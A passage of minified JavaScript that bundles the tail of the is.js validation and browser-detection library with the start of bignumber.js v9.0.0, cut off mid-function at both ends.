l={affirmative:/^(?:1|t(?:rue)?|y(?:es)?|ok(?:ay)?)$/,alphaNumeric:/^[A-Za-z0-9]+$/,caPostalCode:/^(?!.*[DFIOQU])[A-VXY][0-9][A-Z]\s?[0-9][A-Z][0-9]$/,creditCard:/^(?:(4[0-9]{12}(?:[0-9]{3})?)|(5[1-5][0-9]{14})|(6(?:011|5[0-9]{2})[0-9]{12})|(3[47][0-9]{13})|(3(?:0[0-5]|[68][0-9])[0-9]{11})|((?:2131|1800|35[0-9]{3})[0-9]{11}))$/,dateString:/^(1[0-2]|0?[1-9])([\/-])(3[01]|[12][0-9]|0?[1-9])(?:\2)(?:[0-9]{2})?[0-9]{2}$/,email:/^((([a-z]|\d|[!#\$%&'\*\+\-\/=\?\^_`{\|}~]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])+(\.([a-z]|\d|[!#\$%&'\*\+\-\/=\?\^_`{\|}~]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])+)*)|((\x22)((((\x20|\x09)*(\x0d\x0a))?(\x20|\x09)+)?(([\x01-\x08\x0b\x0c\x0e-\x1f\x7f]|\x21|[\x23-\x5b]|[\x5d-\x7e]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])|(\\([\x01-\x09\x0b\x0c\x0d-\x7f]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF]))))*(((\x20|\x09)*(\x0d\x0a))?(\x20|\x09)+)?(\x22)))@((([a-z]|\d|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])|(([a-z]|\d|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])([a-z]|\d|-|\.|_|~|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])*([a-z]|\d|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])))\.)+(([a-z]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])|(([a-z]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])([a-z]|\d|-|\.|_|~|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])*([a-z]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])))$/i,eppPhone:/^\+[0-9]{1,3}\.[0-9]{4,14}(?:x.+)?$/,hexadecimal:/^(?:0x)?[0-9a-fA-F]+$/,hexColor:/^#?([0-9a-fA-F]{3}|[0-9a-fA-F]{6})$/,ipv4:/^(?:(?:\d|[1-9]\d|1\d{2}|2[0-4]\d|25[0-5])\.){3}(?:\d|[1-9]\d|1\d{2}|2[0-4]\d|25[0-5])$/,ipv6:/^((?=.*::)(?!.*::.+::)(::)?([\dA-F]{1,4}:(:|\b)|){5}|([\dA-F]{1,4}:){6})((([\dA-F]{1,4}((?!\3)::|:\b|$))|(?!\2\3)){2}|(((2[0-4]|1\d|[1-9])?\d|25[0-5])\.?\b){4})$/i,nanpPhone:/^\(?([0-9]{3})\)?[-. ]?([0-9]{3})[-. ]?([0-9]{4})$/,socialSecurityNumber:/^(?!000|666)[0-8][0-9]{2}-?(?!00)[0-9]{2}-?(?!0000)[0-9]{4}$/,timeString:/^(2[0-3]|[01]?[0-9]):([0-5]?[0-9]):([0-5]?[0-9])$/,ukPostCode:/^[A-Z]{1,2}[0-9RCHNQ][0-9A-Z]?\s?[0-9][ABD-HJLNP-UW-Z]{2}$|^[A-Z]{2}-?[0-9]{4}$/,url:/^(?:(?:https?|ftp):\/\/)?(?:(?!(?:10|127)(?:\.\d{1,3}){3})(?!(?:169\.254|192\.168)(?:\.\d{1,3}){2})(?!172\.(?:1[6-9]|2\d|3[0-1])(?:\.\d{1,3}){2})(?:[1-9]\d?|1\d\d|2[01]\d|22[0-3])(?:\.(?:1?\d{1,2}|2[0-4]\d|25[0-5])){2}(?:\.(?:[1-9]\d?|1\d\d|2[0-4]\d|25[0-4]))|(?:(?:[a-z\u00a1-\uffff0-9]-*)*[a-z\u00a1-\uffff0-9]+)(?:\.(?:[a-z\u00a1-\uffff0-9]-*)*[a-z\u00a1-\uffff0-9]+)*(?:\.(?:[a-z\u00a1-\uffff]{2,})))(?::\d{2,5})?(?:\/\S*)?$/i,usZipCode:/^[0-9]{5}(?:-[0-9]{4})?$/};function d(t,e){n[t]=function(n){return e[t].test(n)}}for(var s in l){if(l.hasOwnProperty(s)){d(s,l)}}n.ip=function(t){return n.ipv4(t)||n.ipv6(t)};n.capitalized=function(t){if(n.not.string(t)){return false}var e=t.split(" ");for(var r=0;r<e.length;r++){var a=e[r];if(a.length){var u=a.charAt(0);if(u!==u.toUpperCase()){return false}}}return true};n.endWith=function(t,e){if(n.not.string(t)){return false}e+="";var r=t.length-e.length;return r>=0&&t.indexOf(e,r)===r};n.endWith.api=["not"];n.include=function(n,t){return n.indexOf(t)>-1};n.include.api=["not"];n.lowerCase=function(t){return n.string(t)&&t===t.toLowerCase()};n.palindrome=function(t){if(n.not.string(t)){return false}t=t.replace(/[^a-zA-Z0-9]+/g,"").toLowerCase();var e=t.length-1;for(var r=0,a=Math.floor(e/2);r<=a;r++){if(t.charAt(r)!==t.charAt(e-r)){return false}}return true};n.space=function(t){if(n.not.char(t)){return false}var e=t.charCodeAt(0);return e>8&&e<14||e===32};n.startWith=function(t,e){return n.string(t)&&t.indexOf(e)===0};n.startWith.api=["not"];n.upperCase=function(t){return n.string(t)&&t===t.toUpperCase()};var F=["sunday","monday","tuesday","wednesday","thursday","friday","saturday"];var p=["january","february","march","april","may","june","july","august","september","october","november","december"];n.day=function(t,e){return n.date(t)&&e.toLowerCase()===F[t.getDay()]};n.day.api=["not"];n.dayLightSavingTime=function(n){var t=new Date(n.getFullYear(),0,1);var e=new Date(n.getFullYear(),6,1);var r=Math.max(t.getTimezoneOffset(),e.getTimezoneOffset());return n.getTimezoneOffset()<r};n.future=function(t){var e=new Date;return n.date(t)&&t.getTime()>e.getTime()};n.inDateRange=function(t,e,r){if(n.not.date(t)||n.not.date(e)||n.not.date(r)){return false}var a=t.getTime();return a>e.getTime()&&a<r.getTime()};n.inDateRange.api=["not"];n.inLastMonth=function(t){return n.inDateRange(t,new Date((new Date).setMonth((new Date).getMonth()-1)),new Date)};n.inLastWeek=function(t){return n.inDateRange(t,new Date((new Date).setDate((new Date).getDate()-7)),new Date)};n.inLastYear=function(t){return n.inDateRange(t,new Date((new Date).setFullYear((new Date).getFullYear()-1)),new Date)};n.inNextMonth=function(t){return n.inDateRange(t,new Date,new Date((new Date).setMonth((new Date).getMonth()+1)))};n.inNextWeek=function(t){return n.inDateRange(t,new Date,new Date((new Date).setDate((new Date).getDate()+7)))};n.inNextYear=function(t){return n.inDateRange(t,new Date,new Date((new Date).setFullYear((new Date).getFullYear()+1)))};n.leapYear=function(t){return n.number(t)&&(t%4===0&&t%100!==0||t%400===0)};n.month=function(t,e){return n.date(t)&&e.toLowerCase()===p[t.getMonth()]};n.month.api=["not"];n.past=function(t){var e=new Date;return n.date(t)&&t.getTime()<e.getTime()};n.quarterOfYear=function(t,e){return n.date(t)&&n.number(e)&&e===Math.floor((t.getMonth()+3)/3)};n.quarterOfYear.api=["not"];n.today=function(t){var e=new Date;var r=e.toDateString();return n.date(t)&&t.toDateString()===r};n.tomorrow=function(t){var e=new Date;var r=new Date(e.setDate(e.getDate()+1)).toDateString();return n.date(t)&&t.toDateString()===r};n.weekend=function(t){return n.date(t)&&(t.getDay()===6||t.getDay()===0)};n.weekday=a(n.weekend);n.year=function(t,e){return n.date(t)&&n.number(e)&&e===t.getFullYear()};n.year.api=["not"];n.yesterday=function(t){var e=new Date;var r=new Date(e.setDate(e.getDate()-1)).toDateString();return n.date(t)&&t.toDateString()===r};var D=n.windowObject(typeof global=="object"&&global)&&global;var h=n.windowObject(typeof self=="object"&&self)&&self;var v=n.windowObject(typeof this=="object"&&this)&&this;var b=D||h||v||Function("return this")();var g=h&&h.document;var m=b.is;var w=h&&h.navigator;var y=(w&&w.appVersion||"").toLowerCase();var x=(w&&w.userAgent||"").toLowerCase();var A=(w&&w.vendor||"").toLowerCase();n.android=function(){return/android/.test(x)};n.android.api=["not"];n.androidPhone=function(){return/android/.test(x)&&/mobile/.test(x)};n.androidPhone.api=["not"];n.androidTablet=function(){return/android/.test(x)&&!/mobile/.test(x)};n.androidTablet.api=["not"];n.blackberry=function(){return/blackberry/.test(x)||/bb10/.test(x)};n.blackberry.api=["not"];n.chrome=function(n){var t=/google inc/.test(A)?x.match(/(?:chrome|crios)\/(\d+)/):null;return t!==null&&f(t[1],n)};n.chrome.api=["not"];n.desktop=function(){return n.not.mobile()&&n.not.tablet()};n.desktop.api=["not"];n.edge=function(n){var t=x.match(/edge\/(\d+)/);return t!==null&&f(t[1],n)};n.edge.api=["not"];n.firefox=function(n){var t=x.match(/(?:firefox|fxios)\/(\d+)/);return t!==null&&f(t[1],n)};n.firefox.api=["not"];n.ie=function(n){var t=x.match(/(?:msie |trident.+?; rv:)(\d+)/);return t!==null&&f(t[1],n)};n.ie.api=["not"];n.ios=function(){return n.iphone()||n.ipad()||n.ipod()};n.ios.api=["not"];n.ipad=function(n){var t=x.match(/ipad.+?os (\d+)/);return t!==null&&f(t[1],n)};n.ipad.api=["not"];n.iphone=function(n){var t=x.match(/iphone(?:.+?os (\d+))?/);return t!==null&&f(t[1]||1,n)};n.iphone.api=["not"];n.ipod=function(n){var t=x.match(/ipod.+?os (\d+)/);return t!==null&&f(t[1],n)};n.ipod.api=["not"];n.linux=function(){return/linux/.test(y)};n.linux.api=["not"];n.mac=function(){return/mac/.test(y)};n.mac.api=["not"];n.mobile=function(){return n.iphone()||n.ipod()||n.androidPhone()||n.blackberry()||n.windowsPhone()};n.mobile.api=["not"];n.offline=a(n.online);n.offline.api=["not"];n.online=function(){return!w||w.onLine===true};n.online.api=["not"];n.opera=function(n){var t=x.match(/(?:^opera.+?version|opr)\/(\d+)/);return t!==null&&f(t[1],n)};n.opera.api=["not"];n.phantom=function(n){var t=x.match(/phantomjs\/(\d+)/);return t!==null&&f(t[1],n)};n.phantom.api=["not"];n.safari=function(n){var t=x.match(/version\/(\d+).+?safari/);return t!==null&&f(t[1],n)};n.safari.api=["not"];n.tablet=function(){return n.ipad()||n.androidTablet()||n.windowsTablet()};n.tablet.api=["not"];n.touchDevice=function(){return!!g&&("ontouchstart"in h||"DocumentTouch"in h&&g instanceof DocumentTouch)};n.touchDevice.api=["not"];n.windows=function(){return/win/.test(y)};n.windows.api=["not"];n.windowsPhone=function(){return n.windows()&&/phone/.test(x)};n.windowsPhone.api=["not"];n.windowsTablet=function(){return n.windows()&&n.not.windowsPhone()&&/touch/.test(x)};n.windowsTablet.api=["not"];n.propertyCount=function(t,e){if(n.not.object(t)||n.not.number(e)){return false}var a=0;for(var u in t){if(r.call(t,u)&&++a>e){return false}}return a===e};n.propertyCount.api=["not"];n.propertyDefined=function(t,e){return n.object(t)&&n.string(e)&&e in t};n.propertyDefined.api=["not"];n.inArray=function(t,e){if(n.not.array(e)){return false}for(var r=0;r<e.length;r++){if(e[r]===t){return true}}return false};n.inArray.api=["not"];n.sorted=function(t,e){if(n.not.array(t)){return false}var r=i[e]||i[">="];for(var a=1;a<t.length;a++){if(!r(t[a],t[a-1])){return false}}return true};function j(){var t=n;for(var e in t){if(r.call(t,e)&&n["function"](t[e])){var i=t[e].api||["not","all","any"];for(var f=0;f<i.length;f++){if(i[f]==="not"){n.not[e]=a(n[e])}if(i[f]==="all"){n.all[e]=u(n[e])}if(i[f]==="any"){n.any[e]=o(n[e])}}}}}j();n.setNamespace=function(){b.is=m;return this};n.setRegexp=function(n,t){for(var e in l){if(r.call(l,e)&&t===e){l[e]=n}}};return n});
/* bignumber.js v9.0.0 https://github.com/MikeMcl/bignumber.js/LICENCE */!function(e){"use strict";var r,x=/^-?(?:\d+(?:\.\d*)?|\.\d+)(?:e[+-]?\d+)?$/i,L=Math.ceil,U=Math.floor,I="[BigNumber Error] ",T=I+"Number primitive has more than 15 significant digits: ",C=1e14,M=14,G=9007199254740991,k=[1,10,100,1e3,1e4,1e5,1e6,1e7,1e8,1e9,1e10,1e11,1e12,1e13],F=1e7,q=1e9;function j(e){var r=0|e;return 0<e||e===r?r:r-1}function $(e){for(var r,n,t=1,i=e.length,o=e[0]+"";t<i;){for(r=e[t++]+"",n=M-r.length;n--;r="0"+r);o+=r}for(i=o.length;48===o.charCodeAt(--i););return o.slice(0,i+1||1)}function z(e,r){var n,t,i=e.c,o=r.c,s=e.s,f=r.s,u=e.e,l=r.e;if(!s||!f)return null;if(n=i&&!i[0],t=o&&!o[0],n||t)return n?t?0:-f:s;if(s!=f)return s;if(n=s<0,t=u==l,!i||!o)return t?0:!i^n?1:-1;if(!t)return l<u^n?1:-1;for(f=(u=i.length)<(l=o.length)?u:l,s=0;s<f;s++)if(i[s]!=o[s])return i[s]>o[s]^n?1:-1;return u==l?0:l<u^n?1:-1}function H(e,r,n,t){if(e<r||n<e||e!==U(e))throw Error(I+(t||"Argument")+("number"==typeof e?e<r||n<e?" out of range: ":" not an integer: ":" not a primitive number: ")+String(e))}function V(e){var r=e.c.length-1;return j(e.e/M)==r&&e.c[r]%2!=0}function W(e,r){return(1<e.length?e.charAt(0)+"."+e.slice(1):e)+(r<0?"e":"e+")+r}function X(e,r,n){var t,i;if(r<0){for(i=n+".";++r;i+=n);e=i+e}else if(++r>(t=e.length)){for(i=n,r-=t;--r;i+=n);e+=i}else r<t&&(e=e.slice(0,r)+"."+e.slice(r));return e}(r=function e(r){var v,a,h,n,l,s,f,u,c,g,t=B.prototype={constructor:B,toString:null,valueOf:null},w=new B(1),N=20,O=4,p=-7,d=21,m=-1e7,y=1e7,b=!1,o=1,E=0,A={prefix:"",groupSize:3,secondaryGroupSize:0,groupSeparator:",",decimalSeparator:".",fractionGroupSize:0,fractionGroupSeparator:" ",suffix:""},S="0123456789abcdefghijklmnopqrstuvwxyz";function B(e,r){var n,t,i,o,s,f,u,l,c=this;if(!(c instanceof B))return new B(e,r);if(null==r){if(e&&!0===e._isBigNumber)return c.s=e.s,void(!e.c||e.e>y?c.c=c.e=null:e.e<m?c.c=[c.e=0]:(c.e=e.e,c.c=e.c.slice()));if((f="number"==typeof e)&&0*e==0){if(c.s=1/e<0?(e=-e,-1):1,e===~~e){for(o=0,s=e;10<=s;s/=10,o++);return void(c.c=y<o?c.e=null:(c.e=o,[e]))}l=String(e)}else{if(!x.test(l=String(e)))return h(c,l,f);c.s=45==l.charCodeAt(0)?(l=l.slice(1),-1):1}-1<(o=l.indexOf("."))&&(l=l.replace(".","")),0<(s=l.search(/e/i))?(o<0&&(o=s),o+=+l.slice(s+1),l=l.substring(0,s)):o<0&&(o=l.length)}else{if(H(r,2,S.length,"Base"),10==r)return D(c=new B(e),N+c.e+1,O);if(l=String(e),f="number"==typeof e){if(0*e!=0)return h(c,l,f,r);if(c.s=1/e<0?(l=l.slice(1),-1):1,B.DEBUG&&15<l.replace(/^0\.0*|\./,"").length)throw Error(T+e)}else c.s=45===l.charCodeAt(0)?(l=l.slice(1),-1):1;for(n=S.slice(0,r),o=s=0,u=l.length;s<u;s++)if(n.indexOf(t=l.charAt(s))<0){if("."==t){if(o<s){o=u;continue}}else if(!i&&(l==l.toUpperCase()&&(l=l.toLowerCase())||l==l.toLowerCase()&&(l=l.toUpperCase()))){i=!0,s=-1,o=0;continue}return h(c,String(e),f,r)}f=!1,-1<(o=(l=a(l,r,10,c.s)).indexOf("."))?l=l.replace(".",""):o=l.length}for(s=0;48===l.charCodeAt(s);s++);for(u=l.length;48===l.charCodeAt(--u););if(l=l.slice(s,++u)){if(u-=s,f&&B.DEBUG&&15<u&&(G<e||e!==U(e)))throw Error(T+c.s*e);if((o=o-s-1)>y)c.c=c.e=null;else if(o<m)c.c=[c.e=0];else{if(c.e=o,c.c=[],s=(o+1)%M,o<0&&(s+=M),s<u){for(s&&c.c.push(+l.slice(0,s)),u-=M;s<u;)c.c.push(+l.slice(s,s+=M));s=M-(l=l.slice(s)).length}else s-=u;for(;s--;l+="0");c.c.push(+l)}}else c.c=[c.e=0]}function i(e,r,n,t){var i,o,s,f,u;if(null==n?n=O:H(n,0,8),!e.c)return e.toString();if(i=e.c[0],s=e.e,null==r)u=$(e.c),u=1==t||2==t&&(s<=p||d<=s)?W(u,s):X(u,s,"0");else if(o=(e=D(new B(e),r,n)).e,f=(u=$(e.c)).length,1==t||2==t&&(r<=o||o<=p)){for(;f<r;u+="0",f++);u=W(u,o)}else if(r-=s,u=X(u,o,"0"),f<o+1){if(0<--r)for(u+=".";r--;u+="0");}else if(0<(r+=o-f))for(o+1==f&&(u+=".");r--;u+="0");return e.s<0&&i?"-"+u:u}function R(e,r){for(var n,t=1,i=new B(e[0]);t<e.length;t++){if(!(n=new B(e[t])).s){i=n;break}r.call(i,n)&&(i=n)}return i}function _(e,r,n){for(var t=1,i=r.length;!r[--i];r.pop());for(i=r[0];10<=i;i/=10,t++);return(n=t+n*M-1)>y?e.c=e.e=null:e.c=n<m?[e.e=0]:(e.e=n,r),e}function D(e,r,n,t){var i,o,s,f,u,l,c,a=e.c,h=k;if(a){e:{for(i=1,f=a[0];10<=f;f/=10,i++);if((o=r-i)<0)o+=M,s=r,c=(u=a[l=0])/h[i-s-1]%10|0;else if((l=L((o+1)/M))>=a.length){if(!t)break e;for(;a.length<=l;a.push(0));u=c=0,s=(o%=M)-M+(i=1)}else{for(u=f=a[l],i=1;10<=f;f/=10,i++);c=(s=(o%=M)-M+i)<0?0:u/h[i-s-1]%10|0}if(t=t||r<0||null!=a[l+1]||(s<0?u:u%h[i-s-1]),t=n<4?(c||t)&&(0==n||n==(e.s<0?3:2)):5<c||5==c&&(4==n||t||6==n&&(0<o?0<s?u/h[i-s]:0:a[l-1])%10&1||n==(e.s<0?8:7)),r<1||!a[0])return a.length=0,t?(r-=e.e+1,a[0]=h[(M-r%M)%M],e.e=-r||0):a[0]=e.e=0,e;if(0==o?(a.length=l,f=1,l--):(a.length=l+1,f=h[M-o],a[l]=0<s?U(u/h[i-s]%h[s])*f:0),t)for(;;){if(0==l){for(o=1,s=a[0];10<=s;s/=10,o++);for(s=a[0]+=f,f=1;10<=s;s/=10,f++);o!=f&&(e.e++,a[0]==C&&(a[0]=1));break}if(a[l]+=f,a[l]!=C)break;a[l--]=0,f=1}for(o=a.length;0===a[--o];a.pop());}e.e>y?e.c=e.e=null:e.e<m&&(e.c=[e.e=0])}return e}function P(e){var r,n=e.e;return null===n?e.toString():(r=$(e.c),r=n<=p||d<=n?W(r,n):X(r,n,"0"),e.s<0?"-"+r:r)}return B.clone=e,B.ROUND_UP=0,B.ROUND_DOWN=1,B.ROUND_CEIL=2,B.ROUND_FLOOR=3,B.ROUND_HALF_UP=4,B.ROUND_HALF_DOWN=5,B.ROUND_HALF_EVEN=6,B.ROUND_HALF_CEIL=7,B.ROUND_HALF_FLOOR=8,B.EUCLID=9,B.config=B.set=function(e){var r,n;if(null!=e){if("object"!=typeof e)throw Error(I+"Object expected: "+e);if(e.hasOwnProperty(r="DECIMAL_PLACES")&&(H(n=e[r],0,q,r),N=n),e.hasOwnProperty(r="ROUNDING_MODE")&&(H(n=e[r],0,8,r),O=n),e.hasOwnProperty(r="EXPONENTIAL_AT")&&((n=e[r])&&n.pop?(H(n[0],-q,0,r),H(n[1],0,q,r),p=n[0],d=n[1]):(H(n,-q,q,r),p=-(d=n<0?-n:n))),e.hasOwnProperty(r="RANGE"))if((n=e[r])&&n.pop)H(n[0],-q,-1,r),H(n[1],1,q,r),m=n[0],y=n[1];else{if(H(n,-q,q,r),!n)throw Error(I+r+" cannot be zero: "+n);m=-(y=n<0?-n:n)}if(e.hasOwnProperty(r="CRYPTO")){if((n=e[r])!==!!n)throw Error(I+r+" not true or false: "+n);if(n){if("undefined"==typeof crypto||!crypto||!crypto.getRandomValues&&!crypto.randomBytes)throw b=!n,Error(I+"crypto unavailable");b=n}else b=n}if(e.hasOwnProperty(r="MODULO_MODE")&&(H(n=e[r],0,9,r),o=n),e.hasOwnProperty(r="POW_PRECISION")&&(H(n=e[r],0,q,r),E=n),e.hasOwnProperty(r="FORMAT")){if("object"!=typeof(n=e[r]))throw Error(I+r+" not an object: "+n);A=n}if(e.hasOwnProperty(r="ALPHABET")){if("string"!=typeof(n=e[r])||/^.$|[+-.\s]|(.).*\1/.test(n))throw Error(I+r+" invalid: "+n);S=n}}return{DECIMAL_PLACES:N,ROUNDING_MODE:O,EXPONENTIAL_AT:[p,d],RANGE:[m,y],CRYPTO:b,MODULO_MODE:o,POW_PRECISION:E,FORMAT:A,ALPHABET:S}},B.isBigNumber=function(e){if(!e||!0!==e._isBigNumber)return!1;if(!B.DEBUG)return!0;var r,n,t=e.c,i=e.e,o=e.s;e:if("[object Array]"=={}.toString.call(t)){if((1===o||-1===o)&&-q<=i&&i<=q&&i===U(i)){if(0===t[0]){if(0===i&&1===t.length)return!0;break e}if((r=(i+1)%M)<1&&(r+=M),String(t[0]).length==r){for(r=0;r<t.length;r++)if((n=t[r])<0||C<=n||n!==U(n))break e;if(0!==n)return!0}}}else if(null===t&&null===i&&(null===o||1===o||-1===o))return!0;throw Error(I+"Invalid BigNumber: "+e)},B.maximum=B.max=function(){return R(arguments,t.lt)},B.minimum=B.min=function(){return R(arguments,t.gt)},B.random=(n=9007199254740992,l=Math.random()*n&2097151?function(){return U(Math.random()*n)}:function(){return 8388608*(1073741824*Math.random()|0)+(8388608*Math.random()|0)},function(e){var r,n,t,i,o,s=0,f=[],u=new B(w);if(null==e?e=N:H(e,0,q),i=L(e/M),b)if(crypto.getRandomValues){for(r=crypto.getRandomValues(new Uint32Array(i*=2));s<i;)9e15<=(o=131072*r[s]+(r[s+1]>>>11))?(n=crypto.getRandomValues(new Uint32Array(2)),r[s]=n[0],r[s+1]=n[1]):(f.push(o%1e14),s+=2);s=i/2}else{if(!crypto.randomBytes)throw b=!1,Error(I+"crypto unavailable");for(r=crypto.randomBytes(i*=7);s<i;)9e15<=(o=281474976710656*(31&r[s])+1099511627776*r[s+1]+4294967296*r[s+2]+16777216*r[s+3]+(r[s+4]<<16)+(r[s+5]<<8)+r[s+6])?crypto.randomBytes(7).copy(r,s):(f.push(o%1e14),s+=7);s=i/7}if(!b)for(;s<i;)(o=l())<9e15&&(f[s++]=o%1e14);for(i=f[--s],e%=M,i&&e&&(o=k[M-e],f[s]=U(i/o)*o);0===f[s];f.pop(),s--);if(s<0)f=[t=0];else{for(t=-1;0===f[0];f.splice(0,1),t-=M);for(s=1,o=f[0];10<=o;o/=10,s++);s<M&&(t-=M-s)}return u.e=t,u.c=f,u}),B.sum=function(){for(var e=1,r=arguments,n=new B(r[0]);e<r.length;)n=n.plus(r[e++]);return n},a=function(){var d="0123456789";function m(e,r,n,t){for(var i,o,s=[0],f=0,u=e.length;f<u;){for(o=s.length;o--;s[o]*=r);for(s[0]+=t.indexOf(e.charAt(f++)),i=0;i<s.length;i++)s[i]>n-1&&(null==s[i+1]&&(s[i+1]=0),s[i+1]+=s[i]/n|0,s[i]%=n)}return s.reverse()}return function(e,r,n,t,i){var o,s,f,u,l,c,a,h,g=e.indexOf("."),p=N,w=O;for(0<=g&&(u=E,E=0,e=e.replace(".",""),c=(h=new B(r)).pow(e.length-g),E=u,h.c=m(X($(c.c),c.e,"0"),10,n,d),h.e=h.c.length),f=u=(a=m(e,r,n,i?(o=S,d):(o=d,S))).length;0==a[--u];a.pop());if(!a[0])return o.charAt(0);if(g<0?--f:(c.c=a,c.e=f,c.s=t,a=(c=v(c,h,p,w,n)).c,l=c.r,f=c.e),g=a[s=f+p+1],u=n/2,l=l||s<0||null!=a[s+1],l=w<4?(null!=g||l)&&(0==w||w==(c.s<0?3:2)):u<g||g==u&&(4==w||l||6==w&&1&a[s-1]||w==(c.s<0?8:7)),s<1||!a[0])e=l?X(o.charAt(1),-p,o.charAt(0)):o.charAt(0);else{if(a.length=s,l)for(--n;++a[--s]>n;)a[s]=0,s||(++f,a=[1].concat(a));for(u=a.length;!a[--u];);for(g=0,e="";g<=u;e+=o.charAt(a[g++]));e=X(e,f,o.charAt(0))}return e}}(),v=function(){function S(e,r,n){var t,i,o,s,f=0,u=e.length,l=r%F,c=r/F|0;for(e=e.slice();u--;)f=((i=l*(o=e[u]%F)+(t=c*o+(s=e[u]/F|0)*l)%F*F+f)/n|0)+(t/F|0)+c*s,e[u]=i%n;return f&&(e=[f].concat(e)),e}function R(e,r,n,t){var i,o;if(n!=t)o=t<n?1:-1;else for(i=o=0;i<n;i++)if(e[i]!=r[i]){o=e[i]>r[i]?1:-1;break}return o}function _(e,r,n,t){for(var i=0;n--;)e[n]-=i,i=e[n]<r[n]?1:0,e[n]=i*t+e[n]-r[n];for(;!e[0]&&1<e.length;e.splice(0,1));}return function(e,r,n,t,i){var o,s,f,u,l,c,a,h,g,p,w,d,m,v,N,O,y,b=e.s==r.s?1:-1,E=e.c,A=r.c;if(!(E&&E[0]&&A&&A[0]))return new B(e.s&&r.s&&(E?!A||E[0]!=A[0]:A)?E&&0==E[0]||!A?0*b:b/0:NaN);for(g=(h=new B(b)).c=[],b=n+(s=e.e-r.e)+1,i||(i=C,s=j(e.e/M)-j(r.e/M),b=b/M|0),f=0;A[f]==(E[f]||0);f++);if(A[f]>(E[f]||0)&&s--,b<0)g.push(1),u=!0;else{for(v=E.length,O=A.length,b+=2,1<(l=U(i/(A[f=0]+1)))&&(A=S(A,l,i),E=S(E,l,i),O=A.length,v=E.length),m=O,w=(p=E.slice(0,O)).length;w<O;p[w++]=0);y=A.slice(),y=[0].concat(y),N=A[0],A[1]>=i/2&&N++;do{if(l=0,(o=R(A,p,O,w))<0){if(d=p[0],O!=w&&(d=d*i+(p[1]||0)),1<(l=U(d/N)))for(i<=l&&(l=i-1),a=(c=S(A,l,i)).length,w=p.length;1==R(c,p,a,w);)l--,_(c,O<a?y:A,a,i),a=c.length,o=1;else 0==l&&(o=l=1),a=(c=A.slice()).length;if(a<w&&(c=[0].concat(c)),_(p,c,w,i),w=p.length,-1==o)for(;R(A,p,O,w)<1;)l++,_(p,O<w?y:A,w,i),w=p.length}else 0===o&&(l++,p=[0]);g[f++]=l,p[0]?p[w++]=E[m]||0:(p=[E[m]],w=1)}while((m++<v||null!=p[0])&&b--);u=null!=p[0],g[0]||g.splice(0,1)}if(i==C){for(f=1,b=g[0];10<=b;b/=10,f++);D(h,n+(h.e=f+s*M-1)+1,t,u)}else h.e=s,h.r=+u;return h}}(),s=/^(-?)0([xbo])(?=\w[\w.]*$)/i,f=/^([^.]+)\.$/,u=/^\.([^.]+)$/,c=/^-?(Infinity|NaN)$/,g=/^\s*\+(?=[\w.])|^\s+|\s+$/g,h=function(e,r,n,t){var i,o=n?r:r.replace(g,"");if(c.test(o))e.s=isNaN(o)?null:o<0?-1:1;else{if(!n&&(o=o.replace(s,function(e,r,n){return i="x"==(n=n.toLowerCase())?16:"b"==n?2:8,t&&t!=i?e:r}),t&&(i=t,o=o.replace(f,"$1").replace(u,"0.$1")),r!=o))return new B(o,i);if(B.DEBUG)throw Error(I+"Not a"+(t?" base "+t:"")+" number: "+r);e.s=null}e.c=e.e=null},t.absoluteValue=t.abs=function(){var e=new B(this);return e.s<0&&(e.s=1),e},t.comparedTo=function(e,r){return z(this,new B(e,r))},t.decimalPlaces=t.dp=function(e,r){var n,t,i;if(null!=e)return H(e,0,q),null==r?r=O:H(r,0,8),D(new B(this),e+this.e+1,r);if(!(n=this.c))return null;if(t=((i=n.length-1)-j(this.e/M))*M,i=n[i])for(;i%10==0;i/=10,t--);return t<0&&(t=0),t},t.dividedBy=t.div=function(e,r){return v(this,new B(e,r),N,O)},t.dividedToIntegerBy=t.idiv=function(e,r){return v(this,new B(e,r),0,1)},t.exponentiatedBy=t.pow=function(e,r){var n,t,i,o,s,f,u,l,c=this;if((e=new B(e)).c&&!e.isInteger())throw Error(I+"Exponent not an integer: "+P(e));if(null!=r&&(r=new B(r)),s=14<e.e,!c.c||!c.c[0]||1==c.c[0]&&!c.e&&1==c.c.length||!e.c||!e.c[0])return l=new B(Math.pow(+P(c),s?2-V(e):+P(e))),r?l.mod(r):l;if(f=e.s<0,r){if(r.c?!r.c[0]:!r.s)return new B(NaN);(t=!f&&c.isInteger()&&r.isInteger())&&(c=c.mod(r))}else{if(9<e.e&&(0<c.e||c.e<-1||(0==c.e?1<c.c[0]||s&&24e7<=c.c[1]:c.c[0]<8e13||s&&c.c[0]<=9999975e7)))return o=c.s<0&&V(e)?-0:0,-1<c.e&&(o=1/o),new B(f?1/o:o);E&&(o=L(E/M+2))}for(u=s?(n=new B(.5),f&&(e.s=1),V(e)):(i=Math.abs(+P(e)))%2,l=new B(w);;){if(u){if(!(l=l.times(c)).c)break;o?l.c.length>o&&(l.c.length=o):t&&(l=l.mod(r))}if(i){if(0===(i=U(i/2)))break;u=i%2}else if(D(e=e.times(n),e.e+1,1),14<e.e)u=V(e);else{if(0==(i=+P(e)))break;u=i%2}c=c.times(c),o?c.c&&c.c.length>o&&(c.c.length=o):t&&(c=c.mod(r))}return t?l:(f&&(l=w.div(l)),r?l.mod(r):o?D(l,E,O,void 0):l)},t.integerValue=function(e){var r=new B(this);return null==e?e=O:H(e,0,8),D(r,r.e+1,e)},t.isEqualTo=t.eq=function(e,r){return 0===z(this,new B(e,r))},t.isFinite=function(){return!!this.c},t.isGreaterThan=t.gt=function(e,r){return 0<z(this,new B(e,r))},t.isGreaterThanOrEqualTo=t.gte=function(e,r){return 1===(r=z(this,new B(e,r)))||0===r},t.isInteger=function(){return!!this.c&&j(this.e/M)>this.c.length-2},t.isLessThan=t.lt=function(e,r){return 